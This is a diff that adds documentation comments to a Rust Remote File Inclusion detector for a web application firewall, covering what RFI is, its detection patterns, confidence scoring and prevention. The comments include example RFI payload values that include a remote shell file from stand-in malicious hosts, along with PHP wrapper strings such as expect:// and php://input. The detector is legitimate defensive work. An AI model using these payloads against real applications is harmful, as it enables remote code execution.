@@ -1,6 +1,36 @@
 //! RFI Detector
 //!
 //! Detects Remote File Inclusion attacks.
+//!
+//! ## What is RFI?
+//!
+//! Remote File Inclusion attacks exploit applications that include
+//! external files based on user input. Attackers can:
+//! - Execute arbitrary code from remote servers
+//! - Inject malware through compromised URLs
+//! - Take full control of the application
+//!
+//! ## Detection Patterns
+//!
+//! 1. **HTTP/HTTPS URLs in parameters**:
+//!    - `page=http://malicious.local/shell.txt`
+//!    - `include=https://malicious.site/mal.php`
+//! 2. **PHP wrappers**:
+//!    - `php://input`, `php://filter`
+//!    - `data://text/plain`, `expect://`
+//! 3. **Protocol handlers**: `ftp://`, `sftp://`, etc.
+//!
+//! ## Confidence Scoring
+//!
+//! - 0.95: PHP wrapper injection (php://, expect://)
+//! - 0.90: Encoded HTTP URL
+//! - 0.80: HTTP URL in parameter value
+//!
+//! ## Prevention
+//!
+//! - Never include files based on user input without validation
+//! - Use whitelists for allowed includes
+//! - Disable `allow_url_include` in PHP
 
 use regex::Regex;
 use waf_common::*;
